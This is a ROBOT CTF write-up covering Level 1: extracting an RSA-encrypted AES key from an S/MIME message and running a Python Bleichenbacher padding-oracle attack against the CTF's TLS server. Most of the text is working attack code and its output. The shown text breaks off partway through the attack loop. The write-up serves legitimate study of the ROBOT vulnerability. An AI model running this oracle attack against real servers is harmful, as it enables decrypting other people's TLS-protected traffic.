# ROBOT CTF writeup by Bono (Twitter ID: @Bono_iPad):

## genre: crypto + web

## tl;dr
Simple Bleichenbacher attack (crypto) + searching the certificate from the public key at crt.sh (web)

***

On December 12, researchers Hanno Böck, Juraj Somorovskym and Craig Young published a paper, website, testing tool, and CTF (<https://ctf.robotattack.org>) at robotattack.org. I tried this CTF and successfully solved all levels. Here is my writeup of ROBOT CTF.

***


### Level 1 (Crypto): 

The players were given one message encrypted with the Cryptographic Message Syntax (CMS) standard.

```
MIME-Version: 1.0
Content-Disposition: attachment; filename="smime.p7m"
Content-Type: application/pkcs7-mime; smime-type=enveloped-data; name="smime.p7m"
Content-Transfer-Encoding: base64

MIIjZQYJKoZIhvcNAQcDoIIjVjCCI1ICAQAxggFJMIIBRQIBADAtMCAxDjAMBgNV
BAoMBVJPQk9UMQ4wDAYDVQQDDAVyb2JvdAIJAJkov8mr2diyMA0GCSqGSIb3DQEB
AQUABIIBALdE2s65+C6BC/PeKPGgzvdXOVp0iiiONt8cj0zpN/qvNJZrbZXQgWX9
(snip)
mcjupbiWZVbOM2JeDu09Xc8u/Rg9nlKY34PAYXEWSwILLkTmn0C1NvVNze8WBJUm
oPtuWdRb2Odge4aFzdEJ32LHa2nuiE8K+lMLcLs1ajG2uZp/8gq5QRmkmw+sKNWl
BlBTIngExjTIMo4fdxImq8k8ZB3Mnuc4KyYDQBSpMFZQjeb4sYK9HJXEnPXCzdDH
0EVBFeBPjdKdZ59pMErw9LvErdZbrSv+5arsWoPC4flEWxwd117nqCTMOpFSKOkH
rUNwrAbBEibe7xFkG7yw9qaAYx0caV1bk7rhiitShpY4irvHBSeLwIU=
```

First, we need to extract the information from this message.  
The message was encrypted by AES-128-CBC and the AES key was encrypted by the same certificate of target.robotattack.org:7777


#### Step 1. Extract DER file and ciphertext from smime file.

ref. <https://crypto.stackexchange.com/questions/20270/extract-ciphertext-from-encrypted-smime-file>  
  
From this article, you now know how to extract the key and message.  

Extracting the AES key is as follows:  

```
$ openssl smime -in msg.txt -pk7out -out msg.pk7
$ openssl asn1parse -in msg.pk7 -dump
    0:d=0  hl=4 l=9061 cons: SEQUENCE          
    4:d=1  hl=2 l=   9 prim: OBJECT            :pkcs7-envelopedData
   15:d=1  hl=4 l=9046 cons: cont [ 0 ]        
   19:d=2  hl=4 l=9042 cons: SEQUENCE          
   23:d=3  hl=2 l=   1 prim: INTEGER           :00
   26:d=3  hl=4 l= 329 cons: SET               
   30:d=4  hl=4 l= 325 cons: SEQUENCE          
   34:d=5  hl=2 l=   1 prim: INTEGER           :00
   37:d=5  hl=2 l=  45 cons: SEQUENCE          
   39:d=6  hl=2 l=  32 cons: SEQUENCE          
   41:d=7  hl=2 l=  14 cons: SET               
   43:d=8  hl=2 l=  12 cons: SEQUENCE          
   45:d=9  hl=2 l=   3 prim: OBJECT            :organizationName
   50:d=9  hl=2 l=   5 prim: UTF8STRING        :ROBOT
   57:d=7  hl=2 l=  14 cons: SET               
   59:d=8  hl=2 l=  12 cons: SEQUENCE          
   61:d=9  hl=2 l=   3 prim: OBJECT            :commonName
   66:d=9  hl=2 l=   5 prim: UTF8STRING        :robot
   73:d=6  hl=2 l=   9 prim: INTEGER           :9928BFC9ABD9D8B2
   84:d=5  hl=2 l=  13 cons: SEQUENCE          
   86:d=6  hl=2 l=   9 prim: OBJECT            :rsaEncryption
   97:d=6  hl=2 l=   0 prim: NULL              
   99:d=5  hl=4 l= 256 prim: OCTET STRING      
      0000 - b7 44 da ce b9 f8 2e 81-0b f3 de 28 f1 a0 ce f7   .D.........(....
      0010 - 57 39 5a 74 8a 28 8e 36-df 1c 8f 4c e9 37 fa af   W9Zt.(.6...L.7..
      0020 - 34 96 6b 6d 95 d0 81 65-fd 5b 43 1b 83 2c 67 ae   4.km...e.[C..,g.
      0030 - 98 c9 63 e4 f3 77 a9 4d-60 ce eb 8d 0c c4 e6 dd   ..c..w.M`.......
      0040 - 43 0f 8e 73 92 ca 64 17-3c 2a ea 95 3e 4b d1 fe   C..s..d.<*..>K..
      0050 - e6 af 68 1b 3e 7e 42 46-72 c2 bf 95 5a d9 5a 70   ..h.>~BFr...Z.Zp
      0060 - ba 28 62 92 05 83 6d 43-fa f2 57 1e ea a6 34 16   .(b...mC..W...4.
      0070 - d1 fc 3f 54 36 64 60 0f-25 67 8c 02 52 c4 3f 6c   ..?T6d`.%g..R.?l
      0080 - 9e 00 d8 75 73 7e 2f 9b-12 63 a0 9b 41 d1 3d bc   ...us~/..c..A.=.
      0090 - b5 37 3f 73 fc 03 b1 d5-a3 3a f6 76 9f ec 1f ad   .7?s.....:.v....
      00a0 - 20 21 2b 41 bd 9b 36 42-44 db 9c ef 6f 8d 6e 88    !+A..6BD...o.n.
      00b0 - 3c 0f f1 ec db 74 94 63-71 5c 37 c3 6c 18 d8 09   <....t.cq\7.l...
      00c0 - 0e d1 67 58 15 d2 24 16-c2 66 61 b6 7e ba f4 4a   ..gX..$..fa.~..J
      00d0 - ee 11 d3 fa 60 08 34 a4-b8 a7 19 41 aa 70 cc 44   ....`.4....A.p.D
      00e0 - 8f 0b 05 b3 32 ed c5 06-e1 cb 87 fa ac 44 dc 61   ....2........D.a
      00f0 - 92 9e 0a f9 ed ea 4b 5f-f5 20 68 53 15 0b be 40   ......K_. hS...@
  359:d=3  hl=4 l=8702 cons: SEQUENCE          
  363:d=4  hl=2 l=   9 prim: OBJECT            :pkcs7-data
  374:d=4  hl=2 l=  29 cons: SEQUENCE          
  376:d=5  hl=2 l=   9 prim: OBJECT            :aes-128-cbc
  387:d=5  hl=2 l=  16 prim: OCTET STRING      
      0000 - 79 b6 30 66 f7 bd 75 2c-14 a2 46 72 1d b6 c5 4f   y.0f..u,..Fr...O
  405:d=4  hl=4 l=8656 prim: cont [ 0 ]        
```

```
B744DACEB9F82E810BF3DE28F1A0CEF757395A748A288E36DF1C8F4CE937FAAF34966B6D95D08165FD5B431B832C67AE98C963E4F377A94D60CEEB8D0CC4E6DD430F8E7392CA64173C2AEA953E4BD1FEE6AF681B3E7E424672C2BF955AD95A70BA28629205836D43FAF2571EEAA63416D1FC3F543664600F25678C0252C43F6C9E00D875737E2F9B1263A09B41D13DBCB5373F73FC03B1D5A33AF6769FEC1FAD20212B41BD9B364244DB9CEF6F8D6E883C0FF1ECDB749463715C37C36C18D8090ED1675815D22416C26661B67EBAF44AEE11D3FA600834A4B8A71941AA70CC448F0B05B332EDC506E1CB87FAAC44DC61929E0AF9EDEA4B5FF5206853150BBE40
```
This is the encrypted AES key.  
Next, I use dumpasn1 to extract the encrypted message from smime file.  

```
$ openssl asn1parse -in msg.pk7 -out msg.der
$ dumpasn1 -a msg.der`
(snip)
         :             92 9E 0A F9 ED EA 4B 5F F5 20 68 53 15 0B BE 40
         :           }
         :         }
 359 8702:       SEQUENCE {
 363    9:         OBJECT IDENTIFIER data (1 2 840 113549 1 7 1)
 374   29:         SEQUENCE {
 376    9:           OBJECT IDENTIFIER aes128-CBC (2 16 840 1 101 3 4 1 2)
 387   16:           OCTET STRING 79 B6 30 66 F7 BD 75 2C 14 A2 46 72 1D B6 C5 4F
         :           }
 405 8656:         [0]
         :           97 38 0E 9D 31 30 2E 78 D3 2B 0D 71 14 6E 35 EF
         :           46 49 EB 10 EC AC E4 54 54 C1 1C 4E 49 66 C0 78
         :           CF 7E 3D 78 CA 86 66 7F D0 DE 78 08 41 D5 AB 1C
(snip)
```
"97 38.." is the message we want and "79 86 30.." is the initialization vector of AES. I copied this hex and translate to the binary.

#### 2. Check the certificate of the target server.

Now let's check the server's certificate.

```
$ openssl s_client -connect target.robotattack.org:7777 -showcerts
CONNECTED(00000003)
depth=0 O = ROBOT, CN = robot
verify error:num=18:self signed certificate
verify return:1
depth=0 O = ROBOT, CN = robot
verify return:1
---
Certificate chain
 0 s:/O=ROBOT/CN=robot
   i:/O=ROBOT/CN=robot
-----BEGIN CERTIFICATE-----
MIIDEzCCAfugAwIBAgIJAJkov8mr2diyMA0GCSqGSIb3DQEBCwUAMCAxDjAMBgNV
BAoMBVJPQk9UMQ4wDAYDVQQDDAVyb2JvdDAeFw0xNzEyMTAxOTQyNTJaFw0yMDA5
MDQxOTQyNTJaMCAxDjAMBgNVBAoMBVJPQk9UMQ4wDAYDVQQDDAVyb2JvdDCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMQcprGkwe5g4EkapqiHUFQpjnD6
Py82lGePlcZqkDFn5qxfZGK8LI4CN0zx5aWypJF43EQJwESJj1cssf36Sd3AMkpM
Bf+9w+OuGtzWElz7DYs39CORkWXJaIMXfc9lLSAS5Kp3Yt9f9vBgZllPb0QewisA
ZSylgQK2uKjUgoJq7ovKwbHSpqx9VzL+/2oGTCxMj253JxfZ6oKlYDL2MFphItDh
usPKrUfsEerfAACaKzvMe1+zyxNTDxC6196JFo78+nm1adO6Hg7QKKH1a9dF4CNs
fbwTwcx1cvRFAJ7ssjcPoIVJvI1CKc1TVw895sba6DxOWfS6Gt2pxtn9DT8CAwEA
AaNQME4wHQYDVR0OBBYEFBJD1xmfMgjCg2voVYn45+TPO55qMB8GA1UdIwQYMBaA
FBJD1xmfMgjCg2voVYn45+TPO55qMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEL
BQADggEBAH2fL13priV7Q0YG0us/iNyBz25ZSOgiJo6YE/V5dtQErT5gRl4AYXqR
BihX9d53Y/yRa4gNweN7YIDxNkr/aoSgnXWnBGJk0bX204nkBWvV+ZxJF/yZOM7p
GuBXAihJJFAwYGxucH8tLlE/rwNsEOyB2b5nw8bwJ+qKpkEe7G+Wr2H6clI9Z4O2
pSHdCWMY9Hha7HfIjKS0L2oSJaoaXcaJjA1aAGIjkrZdiBCTor6BX05W55ks70sy
Tygumknzuh9BNgnuPK0FYphu5c6/utQLQ49iqdCnm2912AKSdZMy10XcxlBrZHyN
a+FrhpIfu9F1nHZHGzuadkYNnlEbjyY=
-----END CERTIFICATE-----
---
Server certificate
subject=/O=ROBOT/CN=robot
issuer=/O=ROBOT/CN=robot
---
No client certificate CA names sent
Peer signing digest: SHA512
Server Temp Key: ECDH, P-256, 256 bits
---
SSL handshake has read 1296 bytes and written 431 bytes
---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: E637ACBB920C6FFCA551335524B51CA2C85F0E6EBD8562E88FEAB96E2F178EEA
    Session-ID-ctx: 
    Master-Key: FC84A04C83FB155EDC6542290220F91B6CB372AE65B27C62C84F32D6C1E44B5D88C83B99CF241B90F4A8A38A5FECF19A
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1513139368
    Timeout   : 300 (sec)
    Verify return code: 18 (self signed certificate)
---
Hello
```

We can analyze the certificate and get the public key.  

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 11036281759763912882 (0x9928bfc9abd9d8b2)
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: O=ROBOT, CN=robot
        Validity
            Not Before: Dec 10 19:42:52 2017 GMT
            Not After : Sep  4 19:42:52 2020 GMT
        Subject: O=ROBOT, CN=robot
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c4:1c:a6:b1:a4:c1:ee:60:e0:49:1a:a6:a8:87:
                    50:54:29:8e:70:fa:3f:2f:36:94:67:8f:95:c6:6a:
                    90:31:67:e6:ac:5f:64:62:bc:2c:8e:02:37:4c:f1:
                    e5:a5:b2:a4:91:78:dc:44:09:c0:44:89:8f:57:2c:
                    b1:fd:fa:49:dd:c0:32:4a:4c:05:ff:bd:c3:e3:ae:
                    1a:dc:d6:12:5c:fb:0d:8b:37:f4:23:91:91:65:c9:
                    68:83:17:7d:cf:65:2d:20:12:e4:aa:77:62:df:5f:
                    f6:f0:60:66:59:4f:6f:44:1e:c2:2b:00:65:2c:a5:
                    81:02:b6:b8:a8:d4:82:82:6a:ee:8b:ca:c1:b1:d2:
                    a6:ac:7d:57:32:fe:ff:6a:06:4c:2c:4c:8f:6e:77:
                    27:17:d9:ea:82:a5:60:32:f6:30:5a:61:22:d0:e1:
                    ba:c3:ca:ad:47:ec:11:ea:df:00:00:9a:2b:3b:cc:
                    7b:5f:b3:cb:13:53:0f:10:ba:d7:de:89:16:8e:fc:
                    fa:79:b5:69:d3:ba:1e:0e:d0:28:a1:f5:6b:d7:45:
                    e0:23:6c:7d:bc:13:c1:cc:75:72:f4:45:00:9e:ec:
                    b2:37:0f:a0:85:49:bc:8d:42:29:cd:53:57:0f:3d:
                    e6:c6:da:e8:3c:4e:59:f4:ba:1a:dd:a9:c6:d9:fd:
                    0d:3f
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                12:43:D7:19:9F:32:08:C2:83:6B:E8:55:89:F8:E7:E4:CF:3B:9E:6A
            X509v3 Authority Key Identifier: 
                keyid:12:43:D7:19:9F:32:08:C2:83:6B:E8:55:89:F8:E7:E4:CF:3B:9E:6A

            X509v3 Basic Constraints: 
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
         7d:9f:2f:5d:e9:ae:25:7b:43:46:06:d2:eb:3f:88:dc:81:cf:
         6e:59:48:e8:22:26:8e:98:13:f5:79:76:d4:04:ad:3e:60:46:
         5e:00:61:7a:91:06:28:57:f5:de:77:63:fc:91:6b:88:0d:c1:
         e3:7b:60:80:f1:36:4a:ff:6a:84:a0:9d:75:a7:04:62:64:d1:
         b5:f6:d3:89:e4:05:6b:d5:f9:9c:49:17:fc:99:38:ce:e9:1a:
         e0:57:02:28:49:24:50:30:60:6c:6e:70:7f:2d:2e:51:3f:af:
         03:6c:10:ec:81:d9:be:67:c3:c6:f0:27:ea:8a:a6:41:1e:ec:
         6f:96:af:61:fa:72:52:3d:67:83:b6:a5:21:dd:09:63:18:f4:
         78:5a:ec:77:c8:8c:a4:b4:2f:6a:12:25:aa:1a:5d:c6:89:8c:
         0d:5a:00:62:23:92:b6:5d:88:10:93:a2:be:81:5f:4e:56:e7:
         99:2c:ef:4b:32:4f:28:2e:9a:49:f3:ba:1f:41:36:09:ee:3c:
         ad:05:62:98:6e:e5:ce:bf:ba:d4:0b:43:8f:62:a9:d0:a7:9b:
         6f:75:d8:02:92:75:93:32:d7:45:dc:c6:50:6b:64:7c:8d:6b:
         e1:6b:86:92:1f:bb:d1:75:9c:76:47:1b:3b:9a:76:46:0d:9e:
         51:1b:8f:26
```
Now we got enough information from the server. Time to attack!

#### 3. Bleichenbacher attack!

I modify Damian Poddebniak's python script to perform the Bleichenbacher attack,   
<https://github.com/duesee/bleichenbacher/blob/master/Bleichenbacher_Oracle/main.py>  
and the SSL connection part is from "robot-detect".  
<https://github.com/robotattackorg/robot-detect>  

Final payload (After some accidental stop, we recorded and reused some values to restart the attack. Sorry for "in-the-middle-of-the-CTF" quality.)

```python
#!/usr/bin/env python3

# standard modules
import math
import time
import sys
import socket
import os
import argparse
import ssl
import gmpy2
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True


def get_rsa_from_server(server, port):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        raw_socket.settimeout(timeout)
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        return cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e
    except ssl.SSLError as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
        if args.csv:
            # TODO: We could add an extra check that the server speaks TLS without RSA
            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
        quit()
    except (ConnectionRefusedError, socket.timeout) as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("There seems to be no TLS on this host/port.")
        if args.csv:
            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
        quit()

ct = 0

def oracle(pms, messageflow=False):
    global cke_version, ct
    ct += 1
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((ip, args.port))
            s.sendall(ch)
        else:
            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
        s.settimeout(timeout)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if (psize == 2):
                return ("The server sends an Alert after ClientHello")
            # try to read further record data
            while i + psize + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                break
            i += psize + 5
        cke_version = buf[9:11]
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            if len(alert) == 0:
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        # exc_type, exc_obj, exc_tb = sys.exc_info()
        # print("line %i", exc_tb.tb_lineno)
        # print ("Exception received: " + str(e))
        return str(e)


parser = argparse.ArgumentParser(description="Bleichenbacher attack")
parser.add_argument("host", help="Target host")
parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
parser.add_argument("-t", "--timeout", default=5, help="Timeout")
parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
groupcipher = parser.add_mutually_exclusive_group()
groupcipher.add_argument("--gcm", help="Use only GCM/AES256.", action="store_true")
groupcipher.add_argument("--cbc", help="Use only CBC/AES128.", action="store_true")
parser.add_argument("--csv", help="Output CSV format", action="store_true")
args = parser.parse_args()

args.port = int(args.port)
timeout = float(args.timeout)

if args.gcm:
    ch = ch_gcm
elif args.cbc:
    ch = ch_cbc
else:
    ch = ch_def

# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

try:
    ip = socket.gethostbyname(args.host)
except socket.gaierror as e:
    if not args.quiet:
        print("Cannot resolve host: %s" % e)
    if args.csv:
        print("NODNS,%s,,,,,,,,," % (args.host))

    quit()


if not args.quiet:
    print("Scanning host %s ip %s port %i" % (args.host, ip, args.port))

N, e = get_rsa_from_server(ip, args.port)
modulus_bits = int(math.ceil(math.log(N, 2)))
modulus_bytes = (modulus_bits + 7) // 8
if not args.quiet:
    print("RSA N: %s" % hex(N))
    print("RSA e: %s" % hex(e))
    print ("Modulus size: %i bits, %i bytes" % (modulus_bits, modulus_bytes))

cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))
# pad_len is length in hex chars, so bytelen * 2
pad_len = (modulus_bytes - 48 - 3) * 2
rnd_pad = ("abcd" * (pad_len // 2 + 1))[:pad_len]

rnd_pms = "aa112233445566778899112233445566778899112233445566778899112233445566778899112233445566778899"
pms_good_in = int("0002" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# wrong first two bytes
pms_bad_in1 = int("4117" + rnd_pad + "00" + "0303" + rnd_pms, 16)
# 0x00 on a wrong position, also trigger older JSSE bug
pms_bad_in2 = int("0002" + rnd_pad + "11" + rnd_pms + "0011", 16)
# no 0x00 in the middle
pms_bad_in3 = int("0002" + rnd_pad + "11" + "1111" + rnd_pms, 16)
# wrong version number (according to Klima / Pokorny / Rosa paper)
pms_bad_in4 = int("0002" + rnd_pad + "00" + "0202" + rnd_pms, 16)

pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad1 = int(gmpy2.powmod(pms_bad_in1, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad2 = int(gmpy2.powmod(pms_bad_in2, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad3 = int(gmpy2.powmod(pms_bad_in3, e, N)).to_bytes(modulus_bytes, byteorder="big")
pms_bad4 = int(gmpy2.powmod(pms_bad_in4, e, N)).to_bytes(modulus_bytes, byteorder="big")


oracle_good = oracle(pms_good, messageflow=False)
oracle_bad1 = oracle(pms_bad1, messageflow=False)
oracle_bad2 = oracle(pms_bad2, messageflow=False)
oracle_bad3 = oracle(pms_bad3, messageflow=False)
oracle_bad4 = oracle(pms_bad4, messageflow=False)

if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
    if not args.quiet:
        print("Identical results (%s), retrying with changed messageflow" % oracle_good)
    oracle_good = oracle(pms_good, messageflow=True)
    oracle_bad1 = oracle(pms_bad1, messageflow=True)
    oracle_bad2 = oracle(pms_bad2, messageflow=True)
    oracle_bad3 = oracle(pms_bad3, messageflow=True)
    oracle_bad4 = oracle(pms_bad4, messageflow=True)
    if (oracle_good == oracle_bad1 == oracle_bad2 == oracle_bad3 == oracle_bad4):
        if not args.quiet:
            print("Identical results (%s), no working oracle found" % oracle_good)
            print("NOT VULNERABLE!")
        if args.csv:
            print("SAFE,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
        sys.exit(1)
    else:
        flow = True
else:
    flow = False

# Re-checking all oracles to avoid unreliable results
oracle_good_verify = oracle(pms_good, messageflow=flow)
oracle_bad_verify1 = oracle(pms_bad1, messageflow=flow)
oracle_bad_verify2 = oracle(pms_bad2, messageflow=flow)
oracle_bad_verify3 = oracle(pms_bad3, messageflow=flow)
oracle_bad_verify4 = oracle(pms_bad4, messageflow=flow)

if (oracle_good != oracle_good_verify) or (oracle_bad1 != oracle_bad_verify1) or (oracle_bad2 != oracle_bad_verify2) or (oracle_bad3 != oracle_bad_verify3) or (oracle_bad4 != oracle_bad_verify4):
    if not args.quiet:
        print("Getting inconsistent results, aborting.")
    if args.csv:
        print("INCONSISTENT,%s,%s,,,,%s,%s,%s,%s,%s" % (args.host, ip, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
    quit()

# If the response to the invalid PKCS#1 request (oracle_bad1) is equal to both
# requests starting with 0002, we have a weak oracle. This is because the only
# case where we can distinguish valid from invalid requests is when we send
# correctly formatted PKCS#1 message with 0x00 on a correct position. This
# makes our oracle weak
if (oracle_bad1 == oracle_bad2 == oracle_bad3):
    oracle_strength = "weak"
    if not args.quiet:
        print ("The oracle is weak, the attack would take too long")
else:
    oracle_strength = "strong"
    if not args.quiet:
        print("The oracle is strong, real attack is possible")

if flow:
    flowt = "shortened"
else:
    flowt = "standard"

if cke_version[0] == 3 and cke_version[1] == 0:
    tlsver = "SSLv3"
elif cke_version[0] == 3 and cke_version[1] == 1:
    tlsver = "TLSv1.0"
elif cke_version[0] == 3 and cke_version[1] == 2:
    tlsver = "TLSv1.1"
elif cke_version[0] == 3 and cke_version[1] == 3:
    tlsver = "TLSv1.2"
else:
    tlsver = "TLS raw version %i/%i" % (cke_version[0], cke_version[1])

if args.csv:
    print("VULNERABLE,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s" % (args.host, ip, tlsver, oracle_strength, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))
else:
    print("VULNERABLE! Oracle (%s) found on %s/%s, %s, %s message flow: %s/%s (%s / %s / %s)" % (oracle_strength, args.host, ip, tlsver, flowt, oracle_good, oracle_bad1, oracle_bad2, oracle_bad3, oracle_bad4))

if not args.quiet:
    print("Result of good request:                        %s" % oracle_good)
    print("Result of bad request 1 (wrong first bytes):   %s" % oracle_bad1)
    print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
    print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
    print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)

print("Now Let's do the real!")

our_c = 0xB744DACEB9F82E810BF3DE28F1A0CEF757395A748A288E36DF1C8F4CE937FAAF34966B6D95D08165FD5B431B832C67AE98C963E4F377A94D60CEEB8D0CC4E6DD430F8E7392CA64173C2AEA953E4BD1FEE6AF681B3E7E424672C2BF955AD95A70BA28629205836D43FAF2571EEAA63416D1FC3F543664600F25678C0252C43F6C9E00D875737E2F9B1263A09B41D13DBCB5373F73FC03B1D5A33AF6769FEC1FAD20212B41BD9B364244DB9CEF6F8D6E883C0FF1ECDB749463715C37C36C18D8090ED1675815D22416C26661B67EBAF44AEE11D3FA600834A4B8A71941AA70CC448F0B05B332EDC506E1CB87FAAC44DC61929E0AF9EDEA4B5FF5206853150BBE40
our_n = 0x00c41ca6b1a4c1ee60e0491aa6a8875054298e70fa3f2f3694678f95c66a903167e6ac5f6462bc2c8e02374cf1e5a5b2a49178dc4409c044898f572cb1fdfa49ddc0324a4c05ffbdc3e3ae1adcd6125cfb0d8b37f423919165c96883177dcf652d2012e4aa7762df5ff6f06066594f6f441ec22b00652ca58102b6b8a8d482826aee8bcac1b1d2a6ac7d5732feff6a064c2c4c8f6e772717d9ea82a56032f6305a6122d0e1bac3caad47ec11eadf00009a2b3bcc7b5fb3cb13530f10bad7de89168efcfa79b569d3ba1e0ed028a1f56bd745e0236c7dbc13c1cc7572f445009eecb2370fa08549bc8d4229cd53570f3de6c6dae83c4e59f4ba1adda9c6d9fd0d3f
our_e = 65537
k = 256

if N != our_n or our_e != e:
   print (N)
   print (our_n)
   print (e)
   print (our_e)
   print ("!?")
   exit(1)

print ("N==our_n",N==our_n,"e=our_e",e==our_e)
print ("Check OK.")

B = pow(2, 8 * (k - 2))
B2 = 2 * B
B3 = B2 + B

# pms_good = int(gmpy2.powmod(pms_good_in, e, N)).to_bytes(modulus_bytes, byteorder="big")

# find s_0
#s_0 = 1
#s_0 = 12000

s_0 = 18646 # recorded value (Actually we didn't need this one)

"""
searching s_0... 18648
TLS alert 10 of length 7 TLS alert 10 of length 7
s_0 found. 18648
double check.
OK
"""

def extended_gcd(aa, bb):
    """
    http://rosettacode.org/wiki/Modular_inverse#Python
    """
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient * x, x
        y, lasty = lasty - quotient * y, y
    return lastremainder, lastx * (-1 if aa < 0 else 1), lasty * (-1 if bb < 0 else 1)


def modinv(a, m):
    """
    http://rosettacode.org/wiki/Modular_inverse#Python
    """
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m


def interval(a, b):
    return range(a, b + 1)

def ceildiv(a, b):
    """
    http://stackoverflow.com/a/17511341
    """
    return -(-a // b)

def floordiv(a, b):
    """
    http://stackoverflow.com/a/17511341
    """
    return a // b

while True:
  s_0 += 1
  print ("searching s_0...",s_0)
  c_d = (our_c * pow(s_0,e,N)) % N
  c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
  q = oracle(c, messageflow=flow)
  print (q,oracle_good)
  if q == oracle_good:
    print ("s_0 found.",s_0)
    print ("double check.")
    if q == oracle(c, messageflow=flow):
      print ("OK")
      break
    else:
      print ("no...")

set_m_old = {(B2, B3 - 1)}
i = 1
s_old = 37294 # recorded value
n = N

while True:
        print("Starting with Step 2")

        if i == 1:
            print("Starting with Step 2.a")

            #s_new = ceildiv(n, B3)  # Explanation follows...
            # ceildiv(n, B3) > s_0. So s_new = s_0+1
            s_new = s_old + 1
            while True:
              c_d = (our_c * pow(s_new,e,N)) % N
              c = int(c_d).to_bytes(modulus_bytes, byteorder="big")
              q = oracle(c, messageflow=flow)
